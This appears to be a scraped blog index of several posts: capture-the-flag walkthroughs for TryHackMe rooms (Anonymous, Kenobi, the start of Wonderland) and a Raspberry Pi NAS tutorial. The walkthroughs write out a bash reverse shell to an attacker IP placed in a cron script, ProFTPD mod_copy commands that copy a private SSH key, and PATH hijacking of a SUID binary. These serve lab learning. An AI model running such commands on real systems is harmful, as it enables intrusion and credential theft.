removed_files.log-rw-r--r-- 1 1000 1000 68 May 12 2020 to_do.txt226 Directory send OK.From the output, we see that this FTP server is owned my NamelessOne. As shown, there is a scripts/ directory which contains various files: clean.sh removedfiles.log to_do.txtThe clean.sh script simply looks in the /tmp directory for any files, and then deletes them, and logs the output to the removed_files.log file.#!/bin/bashtmp_files=0echo $tmp_filesif [ $tmp_files=0 ]then echo \"Running cleanup script: nothing to delete\" &gt;&gt; /var/ftp/scripts/removed_files.logelse for LINE in $tmp_files; do rm -rf /tmp/$LINE &amp;&amp; echo \"$(date) | Removed file /tmp/$LINE\" &gt;&gt; /var/ftp/scripts/removed_files.log;donefiInitially, the script sets the variable tmp_files to 0. It then checks if the value of tmp_files is equal to 0. If so, it then echoes “Running cleanup script: nothing to delete” and appends it to removed_files.log. If the value is not 0, the script will remove the file and print another log message, once again appending it to removed_files.log.Finally, the to_do.txt contains the following:I really need to disable the anonymous login... it's really not safeWe can also enumerate the SMB server on ports 139 and 445 using enum4linux:$ enum4linux 10.10.127.27... =================================( Share Enumeration on 10.10.127.27 )================================= Sharename Type Comment --------- ---- ------- print$ Disk Printer Drivers pics Disk My SMB Share Directory for Pics IPC$ IPC IPC Service (anonymous server (Samba, Ubuntu))Reconnecting with SMB1 for workgroup listing. Server Comment --------- ------- Workgroup Master --------- ------- WORKGROUP ANONYMOUSWe appear to have three shares on the SMB server, print$, pics, and ipc$. enum4linux also confirms that we have a namelessone user on the machine.Anonymous login is also enabled on the SMB server:$ smbclient //10.10.127.27/pics Password for [WORKGROUP\\v3r4x]:Try \"help\" to get a list of possible commands.smb: \\&gt; ls . D 0 Sun May 17 12:11:34 2020 .. D 0 Thu May 14 02:59:10 2020 corgo2.jpg N 42663 Tue May 12 01:43:42 2020 puppos.jpeg N 265188 Tue May 12 01:43:42 2020 20508240 blocks of size 1024. 13306416 blocks availableWe can download the contents of the share with the smbget command:$ smbget -R smb://10.10.127.27/pics Password for [v3r4x] connecting to //10.10.127.27/pics: Using workgroup WORKGROUP, user v3r4xsmb://10.10.127.27/pics/corgo2.jpg smb://10.10.127.27/pics/puppos.jpeg Downloaded 300.64kB in 3 secondsIt appears that the SMB share is a rabbit hole, so we must go back to other information that we have and try to find another way in.From the FTP server, the removed_files.log indicates that the clean.sh script has been executed several times. One hypothesis is that is is being run as a cron job. A cron job is a way in which users can schedule tasks within Linux to run at specific times. We can verify this by looking at our version of removed_files.log and the version currently on the FTP server - if it contains more output that ours, we can say that it is a scheduled job.To find the difference between these two files, we can use the diff command:$ diff removed_files1.log removed_files2.logThis will output the difference between the two files, i.e., if one file contains more lines than the other. We can also verify this with the nl command which returns the number of lines in each file:$ nl removed_files1.log 1 Running cleanup script: nothing to delete 2 Running cleanup script: nothing to delete ... 27 Running cleanup script: nothing to delete$ nl removed_files2.log 1 Running cleanup script: nothing to delete 2 Running cleanup script: nothing to delete ... 61 Running cleanup script: nothing to deleteWe can therefore say that the cleanup.sh script is run as a scheduled cron job. Since we can modify this file through the FTP server, we can establish a connection to our attacker machine using netcat. Firstly, we have to create a modified cleanup.sh script with our reverse shellcode. In this tutorial, we will use a bash one-liner, but it is important to note that there are a multitude of ways to accomplish this.$ cat &gt; clean.sh#!/bin/bashbash -i &gt;&amp; /dev/tcp/10.8.1.103/4444 0&gt;&amp;1This will call out to 10.8.1.103 (my attacker machine) on port 4444 and redirect any error to 0&gt;&amp;1. Now we need to upload our script to the FTP server. We do this using the put command:We also need to open a netcat listener to ensure the script can establish a connection with our machine. After a few minutes, we get a reverse shell on the victim machine:Subsequently, we can retrieve the user.txt file from the namelessone user’s /home directory:We now have to escalate our privileges to root which will requires further enumeration. To do this, we can use linPEAS which is part of the Privilege Escalation Awesome Scripts Suite. Firstly, we need to upload the linpeas.sh script to the victim machine - we can do this with Python.$ lslinpeas.sh$ sudo python3 -m http.server 80Then on the victim machine, we can retrieve the file and then execute it:namelessone@anonymous:/tmp$ wget http://10.8.1.103:80/linpeas.shnamelessone@anonymous:/tmp$ chmod +x linpeas.shnamelessone@anonymous:/tmp$ ./linpeas.shFrom the output, we see that /usr/bin/env which displays the environment variables present within the system, has the SUID bit set. SUID bits are permissions set for users and groups and when set, can allow certain files to be executed on behalf of those user’s privileges.We can verify this with ls -la:namelessone@anonymous:~$ ls -la /usr/bin/envls -la /usr/bin/env-rwsr-xr-x 1 root root 35000 Jan 18 2018 /usr/bin/envThis means that we can execute the /usr/bin/env binary with the permissions of the root user. To do this, we consult GTFOBins, a curated list of UNIX binaries which can be leveraged to bypass restrictions on misconfigured systems. In particlar, we are interested in the env binary when the SUID bit is set.As per these instructions, we can interact directly with the misconfigured binary on the victim machine and escalate our privileges to root. Finally, we can retrieve the root.txt flag within the root user’s home directory:Closing RemarksAnd that’s it! All done!I hope you all enjoyed this room and learned a thing or two. I really am trying to up my game with these writeups and tutorials for my own learning and so I can share my knowledge with you.If you want to keep up-to-date on what I do, follow me here: Twitter GitHubOr you can also support me by buying me a coffee:Stay curious- v3r4x" }, { "title": "Kenobi Writeup | TryHackMe", "url": "/posts/kenobi-writeup-tryhackme/", "categories": "Writeup, TryHackMe", "tags": "writeup, tryhackme, samba, suid, smb", "date": "2022-06-29 00:00:00 +0100", "snippet": "OverviewNow that the Kenobi series on Disney Plus is over, I thought it would be fitting to tackle the Kenobi room on TryHackMe. In order to complete this room, we must enumerate the target machine for SMB (Server Message Block) shares, exploit a vulnerable version of ProFtpd to gain initial access to the machine, and escalate our privileges via path variable manipulation to get our flags.I hope you enjoy!Task 1 - Deploy the Vulnerable MachineOnce connection is established to the VM, we start with an initial nmap scan:$ sudo nmap -sC -sV -T4 -p- 10.10.207.7 Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-28 23:30 BSTNmap scan report for 10.10.207.7Host is up (0.053s latency).Not shown: 65524 closed tcp ports (reset)PORT STATE SERVICE VERSION21/tcp open ftp ProFTPD 1.3.522/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)| 256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)|_ 256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)80/tcp open http Apache httpd 2.4.18 ((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: Site doesn't have a title (text/html).| http-robots.txt: 1 disallowed entry |_/admin.html111/tcp open rpcbind 2-4 (RPC #100000)| rpcinfo: | program version port/proto service| 100000 2,3,4 111/tcp rpcbind| 100000 2,3,4 111/udp rpcbind| 100000 3,4 111/tcp6 rpcbind| 100000 3,4 111/udp6 rpcbind| 100003 2,3,4 2049/tcp nfs| 100003 2,3,4 2049/tcp6 nfs| 100003 2,3,4 2049/udp nfs| 100003 2,3,4 2049/udp6 nfs| 100005 1,2,3 38433/tcp mountd| 100005 1,2,3 52477/udp6 mountd| 100005 1,2,3 53630/udp mountd| 100005 1,2,3 56743/tcp6 mountd| 100021 1,3,4 37064/udp nlockmgr| 100021 1,3,4 40419/tcp6 nlockmgr| 100021 1,3,4 44130/udp6 nlockmgr| 100021 1,3,4 44465/tcp nlockmgr| 100227 2,3 2049/tcp nfs_acl| 100227 2,3 2049/tcp6 nfs_acl| 100227 2,3 2049/udp nfs_acl|_ 100227 2,3 2049/udp6 nfs_acl139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)445/tcp open netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)2049/tcp open nfs_acl 2-3 (RPC #100227)38433/tcp open mountd 1-3 (RPC #100005)44465/tcp open nlockmgr 1-4 (RPC #100021)48513/tcp open mountd 1-3 (RPC #100005)56651/tcp open mountd 1-3 (RPC #100005)Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelHost script results:| smb-os-discovery: | OS: Windows 6.1 (Samba 4.3.11-Ubuntu)| Computer name: kenobi| NetBIOS computer name: KENOBI\\x00| Domain name: \\x00| FQDN: kenobi|_ System time: 2022-06-28T17:31:12-05:00| smb2-time: | date: 2022-06-28T22:31:12|_ start_date: N/A| smb2-security-mode: | 3.1.1: |_ Message signing enabled but not required| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)|_nbstat: NetBIOS name: KENOBI, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)|_clock-skew: mean: 1h39m58s, deviation: 2h53m12s, median: -1sService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 37.07 secondsHere is a quick overview of the above scan: -sC: Will perform a script scan using a set of default scripts. -sV: Will probe open ports to determine service and version information. -T4: Sets the timing for the scan (higher is faster). -p-: Specifies all ports will be scanned (1-65535).As shown from the scan, on the target machine there are 11 “open” ports. However, given some are RPC, we only need to consider ports 21, 22, 80, 111, 139, 445, and 2049. As such, we can say there are 7 ports open on the target machine.Task 2 - Enumerating Samba for SharesNow that we have completed our initial reconnaissance, we can begin service enumeration. Firstly, let’s take a look at the web server running on port 80:We can also run gobuster to check for hidden directories:$ sudo gobuster dir -u 10.10.207.7 -w /usr/share/wordlists/dirb/common.txt===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://10.10.207.7[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/dirb/common.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Timeout: 10s===============================================================2022/06/29 00:12:05 Starting gobuster in directory enumeration mode===============================================================/.hta (Status: 403) [Size: 276]/.htaccess (Status: 403) [Size: 276]/.htpasswd (Status: 403) [Size: 276]/index.html (Status: 200) [Size: 200]/robots.txt (Status: 200) [Size: 36] /server-status (Status: 403) [Size: 276] ===============================================================2022/06/29 00:12:29 Finished===============================================================Here is a quick overview of the above scan: dir: Will perform a directory scan against a specified target. -u: The URL of the target. -w: Specifies the wordlist to use - /usr/share/wordlists/dirb/common.txt in this case.The output of the scan reveals there are 5 files and 1 directory on the target web server, four of which we are unauthorised to access (403 status code). However, we are able to access robots.txt which reveals:User-agent: *Disallow: /admin.htmlNavigating to admin.html reveals a nice easter egg to tell us we’ve gone down a rabbit hole:We can also enumerate the SMB shares that have been identified. We can do this using nmap:$ sudo nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.207.7Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-29 00:08 BSTNmap scan report for 10.10.207.7Host is up (0.029s latency).PORT STATE SERVICE445/tcp open microsoft-dsHost script results:| smb-enum-shares: | account_used: guest| \\\\10.10.207.7\\IPC$: | Type: STYPE_IPC_HIDDEN| Comment: IPC Service (kenobi server (Samba, Ubuntu))| Users: 2| Max Users: &lt;unlimited&gt;| Path: C:\\tmp| Anonymous access: READ/WRITE| Current user access: READ/WRITE| \\\\10.10.207.7\\anonymous: | Type: STYPE_DISKTREE| Comment: | Users: 0| Max Users: &lt;unlimited&gt;| Path: C:\\home\\kenobi\\share| Anonymous access: READ/WRITE| Current user access: READ/WRITE| \\\\10.10.207.7\\print$: | Type: STYPE_DISKTREE| Comment: Printer Drivers| Users: 0| Max Users: &lt;unlimited&gt;| Path: C:\\var\\lib\\samba\\printers| Anonymous access: &lt;none&gt;|_ Current user access: &lt;none&gt;Nmap done: 1 IP address (1 host up) scanned in 5.15 secondsNote that there are other tools which can be utilised, such as enum4linux that can achieve similar results. In this case, we select the two SMB scripts which are executed against the target on port 445. As shown, there are 3 shares on the target machine, namely guest, anonymous, and print$.We can access the anonymous share using smbclient, as follows:$ smbclient //10.10.207.7/anonymousAs this is an anonymous share, there are no credentials required for access:$ smbclient //10.10.207.7/anonymous Password for [WORKGROUP\\v3r4x]:Try \"help\" to get a list of possible commands.smb: \\&gt;Once we have established access, we can see if there are any files on the share using the ls command:Looks like there is a log.txt file stored on the share. We can download this file by using the get command:smb: \\&gt; get log.txtgetting file \\log.txt of size 12237 as log.txt (79.1 KiloBytes/sec) (average 79.1 KiloBytes/sec)Note, you can also use smbget to recursively download the entire SMB share which is particularly useful if you have a share with lots of files:smbget -R smb://10.10.207.7/anonymousThe log.txt file contains a log of actions which took place on the target machine. It appears that the kenobi user created an SSH key and stored it in the /home/kenobi/.ssh directory.Now that we have successfully enumerated the SMB share, we can move onto the FTP server. Looking back at our nmap scan, we see that FTP is running on port 21. We can also see that it is running ProFtpd (version 1.3.5). Unfortunately, we are unable to access this server at the moment.Moving on, we can see that there is a RPCbind service running on port 111. Specifically, this is a server which converts RPC (Remote Procedure Call) program numbers into universal addresses. When this RPC service is initialised, it tells rpcbind the address at which it is listening and the RPC program number it is serving. You can find a list of RPC program numbers here for future reference.In this case, port 111 is used to access a Network File System (NFS) - RPC program number 100003. We can therefore use nmap to enumerate this:$ sudo nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.207.7Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-29 00:32 BSTNmap scan report for 10.10.207.7Host is up (0.034s latency).PORT STATE SERVICE111/tcp open rpcbind| nfs-showmount: |_ /var *| nfs-statfs: | Filesystem 1K-blocks Used Available Use% Maxfilesize Maxlink|_ /var 9204224.0 1836980.0 6876648.0 22% 16.0T 32000| nfs-ls: Volume /var| access: Read Lookup NoModify NoExtend NoDelete NoExecute| PERMISSION UID GID SIZE TIME FILENAME| rwxr-xr-x 0 0 4096 2019-09-04T08:53:24 .| rwxr-xr-x 0 0 4096 2019-09-04T12:27:33 ..| rwxr-xr-x 0 0 4096 2019-09-04T12:09:49 backups| rwxr-xr-x 0 0 4096 2019-09-04T10:37:44 cache| rwxrwxrwt 0 0 4096 2019-09-04T08:43:56 crash| rwxrwsr-x 0 50 4096 2016-04-12T20:14:23 local| rwxrwxrwx 0 0 9 2019-09-04T08:41:33 lock| rwxrwxr-x 0 108 4096 2019-09-04T10:37:44 log| rwxr-xr-x 0 0 4096 2019-01-29T23:27:41 snap| rwxr-xr-x 0 0 4096 2019-09-04T08:53:24 www|_Nmap done: 1 IP address (1 host up) scanned in 0.84 secondsSimilar to the scan we ran earlier against the SMB share, the above scan selects three nmap scripts which are executed against the target on port 111. From the output, we can see that we have a /var mount visible.Task 3 - Gain Initial Access with ProFtpdNow that we have completed our enumeration, it is time to establish initial access with the target. In this case, we shall be exploiting the vulnerable ProFtpd server, but it is important to note that this room is a walkthrough. As such, often you will not know which service is vulnerable, so proper enumeration is vital.ProFtpd is a free and open-source FTP server, compatible for both UNIX-based and Windows operating systems. From our initial nmap scan, we know that this service is running on port 21 with version 1.3.5. We can confirm this by attempting to connect to it using netcat:$ nc 10.10.207.7 21220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.207.7]We can then utilise searchsploit, a command-line search tool for exploit-db:$ searchsploit proftpd 1.3.5---------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path---------------------------------------------------------------------------------- ---------------------------------ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit) | linux/remote/37262.rbProFTPd 1.3.5 - 'mod_copy' Remote Command Execution | linux/remote/36803.pyProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2) | linux/remote/49908.pyProFTPd 1.3.5 - File Copy | linux/remote/36742.txt---------------------------------------------------------------------------------- ---------------------------------Shellcodes: No ResultsAs shown, there are 4 exploits for version 1.3.5 of ProFtpd. The mod_copy modules implement two commands, namely SITE CPFR and SITE CPTO. These commands are used to copy files or directories from one place to another. In this instance, any unauthenticated user can copy files from any part of the filesystem to a specified destination.From the log file (log.txt) found on the SMB share, we know that the FTP service is running as the kenobi user, and there exists a private SSH key in /home/kenobi/.ssh/. We can therefore copy the id_rsa SSH key from this directory to the NFS location (/var) on the target filesystem. To do this, we can use netcat:$ nc 10.10.207.7 21220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.207.7]SITE CPFR /home/kenobi/.ssh/id_rsa350 File or directory exists, ready for destination nameSITE CPTO /var/tmp/id_rsa250 Copy successfulWe have no successfully moved the id_rsa key to the /var/tmp directory. To access this, we can create mount the NFS on our machine:$ sudo mkdir /mnt/kenobi$ sudo mount 10.10.207.7:/var /mnt/kenobi$ ls -la /mnt/kenobitotal 56drwxr-xr-x 14 root root 4096 Sep 4 2019 .drwxr-xr-x 3 root root 4096 Jun 29 00:53 ..drwxr-xr-x 2 root root 4096 Sep 4 2019 backupsdrwxr-xr-x 9 root root 4096 Sep 4 2019 cachedrwxrwxrwt 2 root root 4096 Sep 4 2019 crashdrwxr-xr-x 40 root root 4096 Sep 4 2019 libdrwxrwsr-x 2 root staff 4096 Apr 12 2016 locallrwxrwxrwx 1 root root 9 Sep 4 2019 lock -&gt; /run/lockdrwxrwxr-x 10 root crontab 4096 Sep 4 2019 logdrwxrwsr-x 2 root mail 4096 Feb 26 2019 maildrwxr-xr-x 2 root root 4096 Feb 26 2019 optlrwxrwxrwx 1 root root 4 Sep 4 2019 run -&gt; /rundrwxr-xr-x 2 root root 4096 Jan 29 2019 snapdrwxr-xr-x 5 root root 4096 Sep 4 2019 spooldrwxrwxrwt 6 root root 4096 Jun 29 00:44 tmpdrwxr-xr-x 3 root root 4096 Sep 4 2019 wwwAs shown above, we create a directory on our machine (/mnt/kenobi) to host the NFS. We then mount the NFS using the mount command, allowing us to access the server from our machine.We can then copy the id_rsa key to our machine and use the umount command to remove the NFS from our machine:$ sudo cp /mnt/kenobi/tmp/id_rsa .$ sudo chmod 600 id_rsa$ sudo umount /mnt/kenobi$ sudo ssh -i id_rsa kenobi@10.10.207.7The authenticity of host '10.10.56.162 (10.10.56.162)' can't be established.ED25519 key fingerprint is SHA256:GXu1mgqL0Wk2ZHPmEUVIS0hvusx4hk33iTcwNKPktFw.This key is not known by any other namesAre you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '10.10.56.162' (ED25519) to the list of known hosts.Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage103 packages can be updated.65 updates are security updates.Last login: Wed Sep 4 07:10:15 2019 from 192.168.1.147To run a command as administrator (user \"root\"), use \"sudo &lt;command&gt;\".See \"man sudo_root\" for details.kenobi@kenobi:~$ We now have initial access on the target machine as the kenobi user. We can then view the user.txt flag within the user’s /home directory:Task 4 - Privilege Escalation with Path Variable ManipulationNow that we have initial access, we must escalate our privileges to gain root access. To do this, we are going to leverage SUID bits to perform path variable manipulation. Firstly, SUID bits are permissions set for users and groups and when set, can allow certain files to be executed on behalf of those user’s privileges.Privileges in UNIX-based systems are set up as read, write, and execute (rwx). You can view those permissions when you run the ls -la command:kenobi@kenobi:~$ ls -la user.txt-rw-rw-r-- 1 kenobi kenobi 33 Sep 4 2019 user.txtAs you can see there are 3 distinct groups of permissions. The first group (rw-) denote the permissions set against the user. The second (rw-) denote the permissions set against the group. Finally, the third group (rw-) denote the permissions set against everyone else.To understand SUID bits, we must also consider SGID and Sticky bits. Consider the following table: Permission On Files On Directories SUID bit User executes the file with permissions of the file owner N/A SGID bit User executes the file with permission of the group owner File created in directory gets the same group owner Sticky bit N/A Users are prevented from deleting files from other users For example, a file created by the root user, with permissions rwSrw-rw means that users can execute the file with root privileges. As such, SUID bits can be very dangerous.To find files which have this bit set, we can use the find command:kenobi@kenobi:~$ find / -perm -u=s -type f 2&gt;/dev/null/sbin/mount.nfs/usr/lib/policykit-1/polkit-agent-helper-1/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/snapd/snap-confine/usr/lib/eject/dmcrypt-get-device/usr/lib/openssh/ssh-keysign/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic/usr/bin/chfn/usr/bin/newgidmap/usr/bin/pkexec/usr/bin/passwd/usr/bin/newuidmap/usr/bin/gpasswd/usr/bin/menu/usr/bin/sudo/usr/bin/chsh/usr/bin/at/usr/bin/newgrp/bin/umount/bin/fusermount/bin/mount/bin/ping/bin/su/bin/ping6The above command will find all files (-type f, starting from the / directory with the SUID bit set for the user group (-u=s). It will also direct any errors to 2&gt;/dev/null to clean the output.As shown, there are a lot of commands with the SUID bit set. In this case, we are looking for files which look like they have been created by the user or do not have the SUID bit set by default. In this case, /usr/bin/menu looks out of place. We can verify this by running the binary:kenobi@kenobi:~$ cd /usr/binkenobi@kenobi:/usr/bin$ ./menu***************************************1. status check2. kernel version3. ifconfig** Enter your choice :We can see 3 options. When executed, the first runs the following:curl -I localhostuname -rifconfigAt first glance, this may not look dangerous. However, as these commands do not run with a full path, i.e., /usr/bin/curl or /usr/bin/uname, we can leverage this and gain a root shell.To do this, we can create a file with the name of curl or uname in a directory of our choice, give it full permissions, and append it to our PATH. When we execute the menu binary, it will use the file we created and execute it with root permissions, thus giving us a shell as the root user.In this case, we create a file called curl with the contents /bin/sh. When executed, the menu binary uses our path variable to find the curl binary, which is actually just our new file. It will then execute this file as the root user, giving us a shell. We can then read the root.txt flag to complete the room.Closing RemarksAnd that’s it! All done!I hope you all enjoyed this room and learned a thing or two. I really am trying to up my game with these writeups and tutorials for my own learning and so I can share my knowledge with you.If you want to keep up-to-date on what I do, follow me here: Twitter GitHubOr you can also support me by buying me a coffee:Stay curious- v3r4x" }, { "title": "How to Turn your Raspberry Pi into a NAS", "url": "/posts/how-to-turn-your-raspberry-pi-into-a-nas/", "categories": "Tutorial, Networking", "tags": "pi, raspberry, nas, network, share, tutorial", "date": "2022-06-09 00:00:00 +0100", "snippet": "OverviewWelcome to my tutorial on how to turn a Raspberry Pi into a NAS. For those of you who don’t know, NAS stands for Network-Attached Storage. A NAS is simply a system that is accessible on a network for the purposes of storing data. Within this tutorial, I utilise a Raspberry Pi, mainly becayse of its afforability, but also because of its portability.You can use a NAS for virtually anything. Personally, I’m using to hold malware samples that I don’t want floating around my main PC as well as using it to store CTF writeups. It works the same as any other storage device, only that instead of plugging it into your PC or laptop, you can access it over your home network.So let’s get into it!What You NeedHere are a few things you’ll need to follow along with this tutorial: Raspberry Pi (the more RAM the better) I recommend the RPi4, but I only have a RPi3 so don’t worry if your hardware doesn’t match exactly. External storage Again, this really doesn’t matter but I’m using a Samsung T7 1TB SSD because it’s lightning fast! Ethernet cable (optional) I would recommend you use an Ethernet cable to set this up, but Wi-Fi will do just fine. Preparing the Raspberry PiBefore you set up your NAS, you need to configure your Raspberry Pi with the correct operating system in order to host it.So, take your SD Card, insert it into your adapter, and plug it into your computer.Then, using the Raspberry Pi Imager, select the “Raspberry Pi OS Lite (32-bit)” operating system. This will install a barebones version of the Pi OS without any GUI components or applications.Next, select your SD Card which you wish to write the operating system onto. Make sure you select the correct device and don’t accidentally overwrite something important!As an optional step, you can configure additonal settings on the Pi, by hitting CTRL+SHIFT+X on your keyboard. This will bring up an “Advanced options” tab which can allow you to configure SSH, usernames/passwords, and even Wi-Fi. I recommend using a wired Ethernet connection to ensure you don’t run into any problems in later stages of this tutorial, but there’s no harm in using Wi-Fi.For my configuration, I enabled SSH and left the default username and password combo (pi:raspberry) as well as setting the hostname to nas.Once you have finished, click “Write” and accept the prompt.Access your Raspberry Pi via SSHIn order to access your Pi via SSH, you first need to know its IP address. There are a few ways to do this, but the easiest is to go into your router’s configuration page and find devices which recently connected to your network.Then, you can access it via SSH through the following command:$ ssh username@&lt;ip_address&gt;Simply supply the IP address of your Pi along with the username of the user you configured in the previous step. If you didn’t configure a username/password, the default is pi with the password raspberry.Once connected, you want to ensure your Pi is up-to-date. You can run the following command to update the available repositories and upgrade (install) those updates.$ sudo apt update -y &amp;&amp; sudo apt upgrade -yInstalling NAS SoftwareOne of the best, and arguably one of the easiest to install, NAS solutions is OpenMediaVault. This is a great piece of software, based on Debian, that comes loaded with services like SSH, FTP, BitTorrent, and so much more.To install OpenMediaVault on your Pi, run the following:$ sudo wget -O - https://raw.githubusercontent.com/OpenMediaVault-Plugin-Developers/installScript/master/install | sudo bashThis grabs an install script from GitHub and then runs it with bash. This may take some time, so be patient! It is also worth mentioning that if you’re accessing the Pi via SSH, you may get disconnected while the software is being installed, so you will have to reconnect before continuing.Accessing OpenMediaVaultOn your web browser of choice, navigate to the IP address of your Pi. This will bring you to a login page for OpenMediaVault.By default, the username:password combination is admin:openmediavault. Once logged in, you will see a layout similar to the one shown below:After I logged in, I immediately changed the default password. To do this, click the settings icon on the top-right of the dashboard, and click Change Password.Once you have entered in a new password, click Save. Note, you may have to log back in after you save the new password.Adding External StorageFirstly, make sure you plug your external storage into your Pi. Then, on the OpenMediaVault webpage, click on Disks within the side-bar to view your available storage devices. Your device should appear as shown:You may also notice that your SD Card also appears - in my case that’s /dev/mmcblk0. In theory, you could just use the SD Card as storage, but this is likely going to be very limiting, so you’re better off using some sort of external hard drive or SSD.To configure your external storage as a file system, first click on File Systems within the side-bar, and then select Create from the small plus icon as shown:Then, select your device from the drop-down menu, and click Save. Don’t worry if this produces an error, just try again.Once this is done, click Close.Now you need to mount this new file system. As before, within File Systems, click Mount from the small plus icon.Then, select your newly created file system from the drop-down menu, click Save and accept the prompt.Before you continue, you must apply the changes by clicking the check mark at the top-right of the dashboard.Now that you have the file system mounted on the Pi, you need to create a shared folder. To do this, click on Shared Folders under Storage within the side-bar. Click the small plus icon, provide a name for the folder, and select your external storage device.You can play around with the permissions if you like, but I’m going to leave them default for now.You should now have a shared folder similar to the one shown below:Now that you have successfully configured your storage, click the check mark at the top-right of the webpage and accept the prompt to apply the changes.Configuring AccessThere are many ways you can access your new NAS. However, the main two I will cover in this tutorial are NFS and SMB shares. This is because I’ll be using both Linux and Windows to access my NAS, so I need both NFS (Linux/Mac) and SMB (Windows). You can choose the solution that is best suited to your needs.SMB ConfigurationTo enable SMB, click on SMB/CIFS under Services. Then, click on Settings and toggle the checkbox as shown below.Once you’ve enabled SMB, scroll down and hit the Save button. Now, click on Shares and add the shared folder you created previously:Once again, scroll down and hit Save and apply your changes using the check mark at the top-right of the dashboard.Now that you’ve got this configured, you need to actually access your NAS. You can do this on either Windows or Linux, although Windows makes it slightly more straightforward.Firstly, if you’re on Windows, open up your file explorer and go to This PC. From there, right-click and hit Add a network location.Then, click Next and select Choose a custom network location, and click Next. Next, you want to type in the location of your NAS (its IP address), followed by the name of the share, in the format shown below:Then, click Next and provide a username and password for authentication - if you’re using the default, the credentials will be pi:raspberry. Finally, provide a name for the NAS. Now you should be able to access the NAS as you would any other drive.For the Linux users, you can access the NAS using smbclient. This tool comes pre-installed on Kali Linux, but you may have to install it if you’re using other distributions:$ sudo apt install smbclientThen, to access the share:$ smbclient \\\\\\\\&lt;ip_address&gt;\\\\&lt;share_name&gt;NFS ConfigurationSimilarly, to enable NFS, click NFS under Storage. Click on Settings and toggle the checkbox as shown:Again, hit the Save button and navigate to the Shares tab. Click on the small plus icon and select your shared folder. You then need to supply an IP address range for the clients which are allowed to mount your file system. To find this, run ip a on your Linux machine. I would also recommend changing the privileges to Read/Write as shown:Once this is all configured, hit Save and apply your changes using the check mark at the top-right of the dashboard.Now you need to mount the NAS on your machine so that you can access it. On your Linux system, run the following command:$ showmount -e &lt;ip_address&gt;This will tell you the location of your NAS on your Raspberry Pi. For me, the output was as follows:$ sudo showmount -e 192.168.1.208/export 192.168.1.0/24/export/nas 192.168.1.0/24Using this, I recommend creating a dedicated folder for your NAS on your Linux machine. This will serve solely as a mount point, so that all of your other files aren’t impacted. For me, I put it in my user’s home directory:$ sudo mkdir -p /home/v3r4x/nasThen, to mount your NAS, run the following:$ sudo mount -t nfs &lt;ip_address&gt;:/remote/path/to/nas /local/path/to/nasFor example, the command I ran was as follows:$ sudo mount -t nfs 192.168.1.208:/export/nas /home/v3r4x/nasClosingAnd that’s it! You’ve successfully turned your Raspberry Pi into a NAS! Unfortunately, I wasn’t able to cover absolutely eveyrthing in this tutorial, particularly regarding OpenMediaVault. I would highly recommend you check out the OpenMediaVault wiki if you want to take full advantage of it.I really hope you enjoyed this and hopefully you learned a thing or two. I love making these tutorials and will be making a conscious effort to share as much as I possibly can with you to help my learning as well as to benefit you.If you want to keep up to date on what I do, follow me here: Twitter GitHubOr you can also support me by buying me a coffee:Stay curious- v3r4x" }, { "title": "Wonderland Writeup | TryHackMe", "url": "/posts/wonderland-writeup-tryhackme/", "categories": "Writeup, TryHackMe", "tags": "writeup, tryhackme, ctf, wonderland, privesc, linux", "date": "2022-01-30 00:00:00 +0000", "snippet": "OverviewThis is my writeup for the Wonderland CTF. The Wonderland CTF is a free room of intermediate difficulty which tests your knowledge of privilege escalation. This challenge has no shortage of rabbit holes (pun intended) so it’s important to remain cautious and stick to your methodology.How to AccessI completed this CTF challenge on TryHackMe.Link to the room: https://tryhackme.com/room/wonderlandStepsWhen tackling a CTF like this, the standard practice is to start with reconnaissance. I typically start with an nmap scan:$ nmap -sC -sV -T4 -p- -oN nmap/initial_scan 10.10.7.151# Nmap 7.91 scan initiated Sun Mar 14 00:30:18 2021 as: nmap -sC -sV -T4 -p- -oN nmap/initial_scan 10.10.7.151Nmap scan report for 10.10.7.151Host is up (0.056s latency).Not shown: 65533 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)| 256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)|_ 256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)80/tcp open http Golang net/http server 